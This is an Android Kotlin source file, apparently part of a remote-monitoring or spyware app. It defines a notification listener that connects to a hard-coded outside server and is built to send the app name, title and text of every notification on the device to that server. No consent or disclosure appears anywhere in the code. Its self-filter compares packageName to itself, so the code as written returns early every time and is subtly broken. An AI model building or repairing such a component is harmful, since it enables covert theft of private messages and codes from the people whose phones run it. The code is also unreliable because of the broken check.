package com.remote.system

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import org.json.JSONException
import org.json.JSONObject
import io.socket.client.IO
import io.socket.client.Socket
import java.net.URISyntaxException

class CustomNotificationListenerService : NotificationListenerService() {
    private val TAG = "NotificationListener"
    private val SERVER_URL = "https://remote-system.onrender.com/" // Use your server URL

    private var socket: Socket? = null
    private var isConnected = false

    override fun onCreate() {
        super.onCreate()
        connectToServer()
    }

    private fun connectToServer() {
        try {
            val options = IO.Options()
            options.reconnection = true
            options.reconnectionDelay = 1000
            options.reconnectionAttempts = Integer.MAX_VALUE

            socket = IO.socket(SERVER_URL, options)
            setupSocketListeners()
            socket?.connect()
        } catch (e: URISyntaxException) {
            Log.e(TAG, "Error connecting to server", e)
        }
    }

    private fun setupSocketListeners() {
        socket?.on(Socket.EVENT_CONNECT) {
            Log.d(TAG, "Notification service connected to server")
            isConnected = true
        }

        socket?.on(Socket.EVENT_DISCONNECT) {
            Log.d(TAG, "Notification service disconnected from server")
            isConnected = false
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        super.onNotificationPosted(sbn)

        val packageName = sbn.packageName
        val notification = sbn.notification

        // Skip our own app's notifications to avoid loops
        if (packageName == packageName) {
            return
        }

        val extras = notification.extras
        val title = extras.getString("android.title") ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""

        try {
            val notificationData = JSONObject()
            notificationData.put("package", packageName)
            notificationData.put("title", title)
            notificationData.put("text", text)
            notificationData.put("time", sbn.postTime)

            // Only send if we're connected to avoid buffer buildup
            if (isConnected && socket != null) {
                socket!!.emit("notification-received", notificationData)
            }
        } catch (e: JSONException) {
            Log.e(TAG, "Error creating notification data", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        socket?.disconnect()
    }
}